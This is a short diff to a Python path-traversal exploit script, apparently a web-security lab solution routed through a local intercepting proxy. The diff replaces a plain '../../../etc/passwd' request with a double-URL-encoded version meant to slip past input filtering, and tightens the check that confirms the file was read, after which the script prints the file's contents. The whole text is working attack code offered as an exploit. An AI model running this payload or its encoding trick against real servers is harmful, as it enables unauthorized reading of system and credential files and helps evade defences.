@@ -8,9 +8,9 @@ proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
 def access_password(url):
     print("(+) Trying to access /etc/passwd file...")
-    passwd_access_url = url + "/image?filename=../../../etc/passwd"
+    passwd_access_url = url + "/image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252f%2565%2574%2563%252f%2570%2561%2573%2573%2577%2564"
     res = requests.get(passwd_access_url, verify=False, proxies=proxies)
-    if "root" in res.text:
+    if "root:x" in res.text:
         print("(+) Successfully exploited and accessed /etc/passwd")
         print("(+) Content of /etc/passwd is:-")
         print(res.text)
